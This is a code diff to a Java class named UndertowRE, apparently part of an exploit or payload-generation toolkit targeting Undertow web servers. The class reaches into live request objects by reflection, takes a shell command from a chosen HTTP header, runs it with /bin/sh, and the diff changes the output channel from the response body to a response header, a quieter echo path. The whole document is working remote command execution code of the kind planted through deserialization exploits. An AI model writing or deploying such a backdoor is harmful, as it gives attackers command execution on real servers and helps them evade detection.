@@ -16,10 +16,10 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Undertow)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class UndertowRE {
     private static String HEADER;
-    
+    private static String RHEADER;
 
     public UndertowRE() {
         try {
@@ -38,13 +38,16 @@ public class UndertowRE {
                     Object request = getFieldValue(value, "originalRequest");
                     Object response = getFieldValue(value, "originalResponse");
 
-                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    String result = exec((String) header);
-                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-                    Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
-                    invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
+                    String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    if (header != null && !header.isEmpty()) {
+                        String result = exec(header);
+                        invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+//                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//                        Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+//                        invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
+                        return;
+                    }
 
-                    return;
                 }
             }
 
@@ -60,10 +63,8 @@ public class UndertowRE {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
@@ -93,7 +94,7 @@ public class UndertowRE {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
